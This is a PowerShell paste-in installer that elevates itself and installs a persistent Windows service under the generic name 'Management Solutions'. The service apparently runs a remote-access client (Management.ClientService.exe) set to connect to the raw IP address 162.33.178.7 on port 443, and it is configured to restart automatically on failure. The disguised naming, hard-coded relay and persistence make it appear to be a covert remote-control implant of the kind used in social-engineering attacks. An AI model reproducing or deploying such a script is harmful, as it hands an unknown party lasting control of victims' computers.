& {
    $ErrorActionPreference = 'Stop'

    if ($PSCommandPath) {
        $ScriptDir = Split-Path -Parent $PSCommandPath
    } else {
        $ScriptDir = (Get-Location).Path
    }

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        if ($PSCommandPath) {
            Write-Host "Re-launching elevated..." -ForegroundColor Yellow
            $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
            Start-Process -FilePath powershell.exe -Verb RunAs -ArgumentList $argList
            return
        }
        Write-Warning "This script needs Administrator. Close this window, reopen PowerShell as Administrator, then paste again."
        return
    }

    $ServiceName = 'Management Solutions'
    $DisplayName = 'Management Solutions'
    $ServiceExe  = 'Management.ClientService.exe'
    $ServiceArgs = '?e=Access&y=Guest&h=162.33.178.7&p=443&k=BgIAAACkAABSU0ExAAgAAAEAAQBJaYRVm4ZWcBbA6oApjrOyZ%2fpsRh9bTJgzjYz6OtNphLoK4afTRl%2bFpx0W8vSTInVk%2bid6gE%2b4D75J6bIDGJwtKHlNmFiwUlP3KbV9LyLDquiLVp6FJrcgX1v8e7fpKCQiQgGmfOQqln84qqnHHp8t4pFoQP2PRstGcD4716nDxkq4xXIzOimGxYj80CgBtCFOM4TarEEc%2bP6WO7yLou2vzJFXjALOcTqB4abdxDzdf2lttQJbFgUxiY3d1ZwzZqkW4NctbsvgeXcAQVWZKDKIhnri3CZPj%2f3K3%2bkJzxHDc4jxZZYZYJy9ougkGaD2qRGcQ%2fMGpgMTG93uz76uxiOy&c=SYSCO&c=&c=&c=&c=&c=&c=&c='
    $DirName     = 'Management Solutions'

    $FilesDir   = Join-Path $ScriptDir 'files'
    $InstallDir = Join-Path ${env:ProgramFiles(x86)} $DirName

    if (-not (Test-Path $FilesDir)) {
        Write-Error "files\ folder not found at: $FilesDir"
        Write-Host "If you pasted this into the console, cd into the extracted ZIP folder first." -ForegroundColor Yellow
        return
    }

    $existingSessionId = $null
    $existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($existing) {
        $oldImagePath = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName" -Name ImagePath -ErrorAction SilentlyContinue).ImagePath
        if ($oldImagePath -and $oldImagePath -match '[?&]s=([0-9a-fA-F-]{36})') {
            $existingSessionId = $Matches[1]
        }
        Write-Host "Removing existing service: $ServiceName"
        if ($existing.Status -ne 'Stopped') {
            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }
        & sc.exe delete $ServiceName | Out-Null
        Start-Sleep -Seconds 2
    }

    if (Test-Path $InstallDir) {
        Write-Host "Cleaning existing folder: $InstallDir"
        Get-ChildItem -LiteralPath $InstallDir -Force | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }

    Write-Host "Copying files to: $InstallDir"
    Copy-Item -Path (Join-Path $FilesDir '*') -Destination $InstallDir -Recurse -Force

    $ExePath = Join-Path $InstallDir $ServiceExe
    if (-not (Test-Path $ExePath)) {
        Write-Error "Service executable not found after copy: $ExePath"
        return
    }

    if ($ServiceArgs -notmatch '[?&]s=[0-9a-fA-F-]') {
        $sessionId = if ($existingSessionId) { $existingSessionId } else { [guid]::NewGuid().ToString() }
        $idx = $ServiceArgs.IndexOf('&k=')
        if ($idx -ge 0) {
            $ServiceArgs = $ServiceArgs.Substring(0, $idx) + "&s=$sessionId" + $ServiceArgs.Substring($idx)
        } else {
            $ServiceArgs = $ServiceArgs + "&s=$sessionId"
        }
        Write-Host "SessionID: $sessionId"
    }

    $BinPath = '"' + $ExePath + '" "' + $ServiceArgs + '"'

    Write-Host "Creating service: $ServiceName"
    New-Service -Name $ServiceName `
                -BinaryPathName $BinPath `
                -DisplayName $DisplayName `
                -StartupType Automatic `
                -ErrorAction Stop | Out-Null

    $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
    Set-ItemProperty -Path $svcKey -Name 'Group' -Value 'Remote Control'

    & sc.exe failure $ServiceName reset= 86400 actions= restart/0/restart/0// | Out-Null

    Write-Host "Starting service..."
    Start-Service -Name $ServiceName

    Write-Host ""
    Write-Host "Installed: $ServiceName" -ForegroundColor Green
    Write-Host "  Folder:  $InstallDir"
    Get-Service -Name $ServiceName | Format-Table Name, Status, StartType -AutoSize
}
